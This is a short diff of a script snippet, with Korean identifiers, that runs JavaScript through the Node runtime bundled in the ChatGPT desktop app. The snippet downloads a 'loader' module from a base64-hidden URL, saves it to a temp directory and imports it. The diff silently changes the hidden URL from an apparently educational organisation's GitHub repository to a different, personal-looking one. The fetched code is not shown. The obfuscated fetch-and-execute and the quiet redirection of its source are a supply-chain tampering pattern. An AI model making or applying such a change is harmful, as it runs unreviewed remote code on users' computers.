@@ -77,7 +77,7 @@ cd "«작업 폴더»" && "/Applications/ChatGPT.app/Contents/Resources/cua_node
 let fs = await import("node:fs/promises"); let os = await import("node:os"); let path = await import("node:path");
 let 작업폴더 = path.resolve(".");
 let 임시 = await fs.mkdtemp(path.join(os.tmpdir(), "makeit-loader-"));
-let r = await fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21ha2VpdC1lZHUvbWFrZWl0LW1pZGRsZS1raXQvbWFpbi8lRUMlOTUlQjEvJUVCJUExJTlDJUVCJThEJTk0Lm1qcw==") + "?t=" + Date.now());
+let r = await fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIwMjVra29uZ2dnZy1sYW5nL21hbWUvbWFpbi8lRUMlOTUlQjEvJUVCJUExJTlDJUVCJThEJTk0Lm1qcw==") + "?t=" + Date.now());
 await fs.writeFile(path.join(임시, "로더.mjs"), await r.text());
 let 로더 = await import("file://" + path.join(임시, "로더.mjs") + "?t=" + Date.now());
 let 앱 = await 로더.불러오기({ 작업폴더 });
